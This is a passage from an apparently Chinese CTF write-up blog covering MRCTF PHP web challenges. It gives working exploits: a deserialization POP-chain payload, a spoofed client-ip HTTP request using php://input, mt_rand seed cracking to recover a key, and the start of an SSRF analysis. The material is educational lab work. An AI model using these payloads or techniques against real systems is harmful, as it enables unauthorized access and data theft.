class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line">__set()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line">__invoke()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure><p>pop链  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Show::__wakeup()-&gt;Show::__toString()-&gt;Test::__get()-&gt;Modifier::__invoke()-&gt;Modifier::append()</span><br><span class="line"></span><br><span class="line">preg_match()正则是匹配字符串，传入的是对象，会触发__toString()，$this-&gt;str-&gt;source  str是Test类，触发__get，属性p是Modifier类，触发__invoke()，include可以利用伪协议包含flag。php源码</span><br></pre></td></tr></table></figure><p>编写序列化脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var&#x3D;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s&#x3D;new Show();</span><br><span class="line">$t&#x3D;new Test();</span><br><span class="line">$s-&gt;str&#x3D;$t;</span><br><span class="line">$s-&gt;source&#x3D;$s;</span><br><span class="line">echo urlencode(serialize($s));</span><br><span class="line">&#x2F;&#x2F;O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><p>将得到的base64解码即可拿到flag</p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开题目查看源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="comment">$query = $_SERVER['QUERY_STRING'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123;</span></span><br><span class="line"><span class="comment">    die('Y0u are So cutE!');</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123;</span></span><br><span class="line"><span class="comment">    echo "you are going to the next ~";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">!--&gt;</span></span><br></pre></td></tr></table></figure><p>$_SERVER是不进行urldecode解析的，被ban了%5f,但是可以传%5F</p><p>第二个使用%0a（换行）结尾即可绕过  关于<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html" target="_blank" rel="noopener">preg_match绕过</a></p><p>拿到secrettw.php，</p><p>查看源码是jencode/<em>aaencode</em>(颜文字),刚入ctf那会在南邮平台见过，直接在F12控制台执行即可</p><p>得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post me Merak</span><br></pre></td></tr></table></figure><p>然后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?php </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于第一个if  使用client-ip绕过，第二个可以使用php://input绕过</p><p>对于chenge写一个解密函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v=<span class="string">"flag.php"</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(base64_encode($re));</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">change();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 470d4194-20d2-4996-bf51-da5557926abb.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">client-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure><h2 id="Not-So-Web-Application"><a href="#Not-So-Web-Application" class="headerlink" title="Not  So Web Application"></a>Not  So Web Application</h2><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>扫描目录得到源码<a href="http://www.zip,还有一个login.php" target="_blank" rel="noopener">www.zip,还有一个login.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);  <span class="comment">//mt_rand(min,max)  返回随机数</span></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>mt_rand种子可以爆破。项目地址<a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">https://github.com/lepiaf/php_mt_seed</a></p><p>按照格式生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">strs=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in range(len(strs)):</span><br><span class="line">    <span class="keyword">print</span>(strings1.find(strs[x]), end=<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">print</span>(strings1.find(strs[x]),<span class="string">'0'</span> ,end=<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">print</span>(len(strings1)<span class="number">-1</span>, end=<span class="string">' '</span>)</span><br><span class="line"><span class="comment"># 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Found 0, trying 1744830464 - 1778384895, speed 46429762 seeds per second </span><br><span class="line">seed = 1775196155</span><br><span class="line">Found 1, trying 4261412864 - 4294967295, speed 44036507 seeds per second </span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure><p>拿到种子，生成私钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();  <span class="comment">//KVQP0LdJKRaV3n9D</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();  <span class="comment">//XuNhoueCDCGceth0</span></span><br></pre></td></tr></table></figure><p>在login.html使用万能账号登陆</p><p><img src="/pic/146.png" alt=""></p><h2 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h2><p>扫描目录有源码<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"我扌your problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是要ssrf</p><p>查看了几个页面后发现Plugin.php中可疑,以下是关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Plugin.php</span></span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HelloWorld_Plugin类中如果传入了admin，就打印出session，是反序列化。HelloWorld_DB类中__wakeup函数创建了一个Typecho_Db类，跟进查看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 